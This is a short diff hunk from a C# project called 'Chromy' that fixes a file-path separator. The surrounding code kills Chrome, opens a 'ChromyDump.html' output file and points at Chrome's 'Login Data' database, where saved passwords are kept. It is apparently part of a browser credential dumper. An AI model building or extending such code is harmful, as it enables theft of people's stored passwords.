@@ -94,7 +94,7 @@ namespace Chromy
             {
                 Console.WriteLine("$> Killing Chrome");
                 KillChrome();
-                path += "ChromyDump.html";
+                path += "\\ChromyDump.html";
                 StreamWriter Writer = new StreamWriter(path, false, Encoding.UTF8);
                 string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                     + "/Google/Chrome/User Data/Default/Login Data"; // path to database file
